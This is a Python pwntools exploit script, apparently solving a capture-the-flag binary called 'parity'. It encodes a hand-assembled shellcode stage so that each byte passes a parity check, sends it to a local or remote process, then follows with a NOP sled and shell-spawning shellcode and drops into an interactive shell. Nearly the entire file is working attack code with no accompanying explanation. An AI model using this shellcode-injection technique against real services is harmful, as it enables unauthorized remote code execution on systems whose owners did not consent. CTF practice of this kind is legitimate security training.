#!/usr/bin/env python3
from curses.ascii import FF
from pwn import *

exe = ELF("./parity")

context.binary = exe
context.log_level = 'debug'

gdbscript=""" """

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("host", port)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def compute_parity(a1: int) -> int:
    # Mirror the 64-bit popcount algorithm from the C code
    a1 &= 0xFFFFFFFFFFFFFFFF
    x = a1 - ((a1 >> 1) & 0x5555555555555555)
    y = (x & 0x3333333333333333) + ((x >> 2) & 0x3333333333333333)
    z = (y + (y >> 4)) & 0x0F0F0F0F0F0F0F0F
    prod = (0x0101010101010101 * z) & 0xFFFFFFFFFFFFFFFF
    return (prod >> 56) & 1

def convertpayload(payload: bytes) -> bytes:
    newpayload = b''
    for i in range(len(payload)):
        if i % 2 == 1:
            newpayload += (payload[i] | 0x80).to_bytes(1, 'little')
        else:
            newpayload += (payload[i] & 0x7f).to_bytes(1, 'little')
    return newpayload

payload = b"\x59\x40\x30\x7a\x11\x23\x7d\x07\x59\x5b\x59\x5b\x59\x5e\x50\x58\x0f\x04"
# pop rcx
# xor [rdx+17], dil
# and edi, dword ptr [rbp + 7]
# pop rcx
# pop rbx
# pop rcx
# pop rbx
# pop rcx
# pop rsi
# push rax
# pop rax
# syscall
for c in payload:
    print(f'computed parity({c:02x}) = {compute_parity(c & 0x7f)}')

context.binary = e = ELF('./parity')

p.sendlineafter(b': ', str(len(payload)).encode())
p.sendafter(b': ', convertpayload(payload))

pause()

sc = asm(shellcraft.sh())
p.send(b'\x90'*20 + sc)

p.interactive()